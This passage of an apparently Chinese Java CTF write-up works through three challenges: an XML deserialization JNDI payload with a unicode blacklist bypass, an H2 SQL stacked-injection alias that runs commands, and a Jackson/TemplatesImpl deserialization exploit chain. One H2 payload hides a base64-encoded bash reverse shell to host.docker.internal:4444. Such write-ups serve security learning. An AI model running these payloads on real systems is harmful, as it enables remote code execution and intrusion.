class="hljs-keyword">else</span> &#123;<br>           System.out.println(maxLength);<br>           System.out.printf(<span class="hljs-string">&quot;Unusual File Detected : %s\n&quot;</span>, userFile.getName());<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>登录可以触发<code>readObjectFromXml</code>。</p><p>最后出题人给出的解释是，用editPass接口的replace逻辑漏洞修改xml固定部分，注释代码并使文件长度符合普通用户xml，以同样逻辑递归注入长度尽量短的xml反序列化payload打JNDI。</p><p>最后极限长度形如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;1&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>ldap://127.0.0.1:1389/Deserialize/Jackson/Command/calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">&lt;/!--&gt;</span><br></code></pre></td></tr></table></figure><p>黑名单直接用unicode编码绕过一下就可以了，改成这种：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span>avax.naming.InitialContext&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用的是X1师傅的JNDIMap工具，挺好使的，省了写Gadget的工夫。</p><p>本地通了，但是远程要一个个改密码太烦了，就不去打了偷个懒hh。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241022163224216.png" alt="image-20241022163224216"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241022163052969.png" alt="image-20241022163052969"></p><h2 id="N1CTF-Junior-EasyDB"><a href="#N1CTF-Junior-EasyDB" class="headerlink" title="N1CTF_Junior-EasyDB"></a>N1CTF_Junior-EasyDB</h2><p>给的是H2依赖：</p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250212160542931.png" class="" title="image-20250212160542931"><p>连接逻辑也很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&#123;&quot;/login&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleLogin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String username, <span class="hljs-meta">@RequestParam</span> String password, HttpSession session, Model model)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.userService.validateUser(username, password)) &#123;<br>            session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, username);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateUser</span><span class="hljs-params">(String username, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;%s&#x27; AND password = &#x27;%s&#x27;&quot;</span>, username, password);<br>        <span class="hljs-keyword">if</span> (!SecurityUtils.check(query)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Throwable var8;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connection.createStatement()) &#123;<br>                stmt.executeQuery(query);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> stmt.getResultSet();<br>                <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = resultSet.next();<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var31) &#123;<br>                    var8 = var31;<br>                    var7 = var31;<br>                    <span class="hljs-keyword">throw</span> var31;<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    <span class="hljs-keyword">if</span> (resultSet != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                resultSet.close();<br>                            &#125; <span class="hljs-keyword">catch</span> (Throwable var30) &#123;<br>                                var7.addSuppressed(var30);<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            resultSet.close();<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">boolean</span>)var8;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>黑名单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> HashSet&lt;String&gt; blackLists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SecurityUtils</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String sql)</span> &#123;<br>        <span class="hljs-keyword">for</span>(String keyword : blackLists) &#123;<br>            <span class="hljs-keyword">if</span> (sql.toLowerCase().contains(keyword)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实形同虚设，因为可以通过N多种方法绕过。</p><p>由于是打H2，很容易想到堆叠注入的那一串。</p><p>虽然题目采取了预编译，但是这里使用的是<code>String.format</code>，仍然可以注入攻击。</p><p><a href="https://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#easydb">2025 N1CTF Junior Web 方向全解 | J1rrY’s Blog</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">admin<span class="hljs-string">&#x27;; CREATE ALIAS evil AS $$void eddie(String cmd) throws Exception&#123; String R=&quot;R&quot;+&quot;untime&quot;;Class&lt;?&gt; c = Class.forName(&quot;java.lang.&quot;+R);Object rt=c.getMethod(&quot;get&quot;+R).invoke(null);c.getMethod(&quot;exe&quot;+&quot;c&quot;,String.class).invoke(rt,cmd);&#125;$$;CALL evil(&#x27;</span>calc.exe<span class="hljs-string">&#x27;);  -- -</span><br></code></pre></td></tr></table></figure><p>官方：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>))); <span class="hljs-comment">// java.lang.Runtime</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;Z2V0UnVudGltZQ==&quot;</span>))); <span class="hljs-comment">// getRuntime</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> m1.invoke(<span class="hljs-literal">null</span>);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;ZXhlYw==&quot;</span>)), String[].class); <span class="hljs-comment">// exec</span><br>m2.invoke(o, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&quot;</span>))&#125;&#125;); <span class="hljs-comment">// bash -i &gt;&amp; /dev/tcp/host.docker.internal/4444 0&gt;&amp;1</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&#x27;;CREATE ALIAS hello AS $$ String hello() throws Exception &#123; Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(&quot;Z2V0UnVudGltZQ==&quot;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(&quot;ZXhlYw==&quot;)), String[].class);m2.invoke(o, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, new String(java.util.Base64.getDecoder().decode(&quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE=&quot;))&#125;&#125;);return null; &#125;$$; CALL hello();--</span><br></code></pre></td></tr></table></figure><h2 id="SCTF2023-hellojava"><a href="#SCTF2023-hellojava" class="headerlink" title="SCTF2023-hellojava"></a>SCTF2023-hellojava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/Hello/&#123;BaseJson&#125;&quot;&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String BaseJson, <span class="hljs-meta">@RequestBody</span> String param)</span> &#123;<br>    <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">MyBean</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (MyBean)mapper.readValue(Base64.decode(BaseJson), MyBean.class);<br>        <span class="hljs-keyword">if</span> (user.getIfInput()) &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(java.util.Base64.getDecoder().decode(param));<br>            <span class="hljs-type">NoObjectInputStream</span> <span class="hljs-variable">NoInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoObjectInputStream</span>(inputStream);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> NoInputStream.readObject();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">HelloList</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).DoSomething((LazyList)obj);<br>            <span class="hljs-keyword">return</span> HelloList;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;<br>        var3.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HelloList&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>很显然的反序列化点位，只不过重写了resolveClass：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; list = Blacklist.readBlackList(<span class="hljs-string">&quot;security/blacklist.txt&quot;</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NoObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(inputStream);<br>        System.out.println(<span class="hljs-built_in">this</span>.list);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.list.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>rasp其实没啥用。用AliyunCTF2023那个POJONode的Jackson链可以直接打通。</p><p>jacksoninject不能从json中获取。这一题的问题点就是怎么给那个input注入一个值，他jackson注解是标识了@jacksoninject，但是用空值绕过：</p><p><a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/</a></p><p>注意导入包把那个rasp的agent给删掉，不然导包冲突会失败。</p><h3 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-comment">//import com.Sctf.bean.Hello;</span><br><span class="hljs-comment">//import com.Sctf.bean.MyBean;</span><br><span class="hljs-keyword">import</span> com.Sctf.controller.NoObjectInputStream;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> scala.collection.immutable.LazyList;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytes1 = ClassPool.getDefault().get(Calc.class.getName()).toBytecode();<br>        <span class="hljs-type">byte</span>[][] bytecode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes1&#125;;<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>,bytecode);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(obj, <span class="hljs-string">&quot;_sdom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>());<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, a);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, xString);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, a);<br><br><br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br><br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bytes);<br>        objectOutputStream.writeObject(s);<br>        <span class="hljs-type">byte</span>[] output = Base64.getEncoder().encode(bytes.toByteArray());<br><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(java.util.Base64.getDecoder().decode(output));<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(output));<br><br>        <span class="hljs-type">NoObjectInputStream</span> <span class="hljs-variable">NoInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoObjectInputStream</span>(inputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> NoInputStream.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span 